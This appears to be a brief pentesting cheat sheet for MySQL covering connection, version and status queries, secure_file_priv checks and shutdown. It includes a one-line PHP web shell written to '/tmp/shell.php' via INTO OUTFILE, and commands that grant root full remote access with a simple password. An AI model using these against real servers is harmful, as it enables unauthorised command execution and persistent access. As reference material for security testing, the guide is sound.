# Pentesting MySQL

## Connect to the server locally
```
mysql -h localhost -u root
```

## Connect to the server remotely
```
mysql -h 192.168.232.131 -u root
```

## Enable remote root access
**For MySQL < 8.0**
```
GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY 'password';
```
**For MySQL > 8.0**
```
CREATE USER 'root'@'%' IDENTIFIED BY 'password';
GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' WITH GRANT OPTION;
```

## Get the SQL version
```
mysql> SELECT version();
+-----------------+
| version()       |
+-----------------+
| 8.0.19-0ubuntu5 |
+-----------------+
1 row in set (0.00 sec)
```
OR
```
mysql> SHOW VARIABLES LIKE "%version%";
+--------------------------+-------------------------------+
| Variable_name            | Value                         |
+--------------------------+-------------------------------+
| immediate_server_version | 999999                        |
| innodb_version           | 8.0.19                        |
| original_server_version  | 999999                        |
| protocol_version         | 10                            |
| slave_type_conversions   |                               |
| tls_version              | TLSv1,TLSv1.1,TLSv1.2,TLSv1.3 |
| version                  | 8.0.19-0ubuntu5               |
| version_comment          | (Ubuntu)                      |
| version_compile_machine  | x86_64                        |
| version_compile_os       | Linux                         |
| version_compile_zlib     | 1.2.11                        |
+--------------------------+-------------------------------+
11 rows in set (0.00 sec)
```
OR
```
mysql> STATUS;
--------------
mysql  Ver 8.0.19-0ubuntu5 for Linux on x86_64 ((Ubuntu))
```

## Get server information
```
mysql> STATUS;
--------------
mysql  Ver 8.0.19-0ubuntu5 for Linux on x86_64 ((Ubuntu))

Connection id:          8
Current database:
Current user:           root@localhost
SSL:                    Not in use
Current pager:          stdout
Using outfile:          ''
Using delimiter:        ;
Server version:         8.0.19-0ubuntu5 (Ubuntu)
Protocol version:       10
Connection:             Localhost via UNIX socket
Server characterset:    utf8mb4
Db     characterset:    utf8mb4
Client characterset:    utf8mb4
Conn.  characterset:    utf8mb4
UNIX socket:            /var/run/mysqld/mysqld.sock
Binary data as:         Hexadecimal
Uptime:                 21 min 45 sec

Threads: 2  Questions: 19  Slow queries: 0  Opens: 126  Flush tables: 3  Open tables: 46  Queries per second avg: 0.014
```

## Check file locations that you can write to
[Source](https://stackoverflow.com/questions/32737478/how-should-i-resolve-secure-file-priv-in-mysql)

When attempting to write to a file you may get the following error:
```
select "<? echo passthru($_GET['cmd']); ?>" INTO OUTFILE '/tmp/shell.php';
ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement
```

You can check the file locations that you can write to by running the following command:
```
mysql> SHOW VARIABLES LIKE "secure_file_priv";
+------------------+-----------------------+
| Variable_name    | Value                 |
+------------------+-----------------------+
| secure_file_priv | /var/lib/mysql-files/ |
+------------------+-----------------------+
1 row in set (0.00 sec)
```

## Shut down the server
```
mysql> shutdown;
ERROR 2006 (HY000): MySQL server has gone away
No connection. Trying to reconnect...
```
